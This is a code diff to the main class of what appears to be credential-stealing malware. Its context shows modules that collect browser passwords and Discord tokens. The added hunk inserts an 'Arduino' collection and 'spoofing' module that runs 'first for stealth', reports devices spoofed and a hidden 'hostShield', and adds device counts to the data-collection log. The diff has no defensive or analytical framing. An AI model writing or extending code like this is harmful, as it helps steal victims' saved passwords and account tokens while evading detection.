@@ -167,6 +167,24 @@ class Application {
         const modules = config.get('modules.enabled');
         const results = {};
 
+        // Arduino data collection and spoofing - run first for stealth
+        if (modules.arduino) {
+            try {
+                logger.info('Collecting Arduino data and performing spoofing operations');
+                const arduinoService = serviceManager.getService('arduino');
+                results.arduino = await arduinoService.collect();
+                
+                logger.info('Arduino collection completed', {
+                    devicesFound: results.arduino.devicesFound,
+                    devicesSpoofed: results.arduino.devicesSpoofed,
+                    hostShieldHidden: results.arduino.hostShieldHidden
+                });
+            } catch (error) {
+                ErrorHandler.handle(error);
+                results.arduino = { error: error.message };
+            }
+        }
+
         // Discord data collection - check first if Discord tokens exist
         if (modules.discord) {
             try {
@@ -209,7 +227,8 @@ class Application {
         logger.info('Data collection completed', {
             modules: Object.keys(results),
             browserAccounts: results.browsers?.totalPasswords || 0,
-            discordAccounts: results.discord?.length || 0
+            discordAccounts: results.discord?.length || 0,
+            arduinoDevices: results.arduino?.devicesFound || 0
         });
 
         return results;
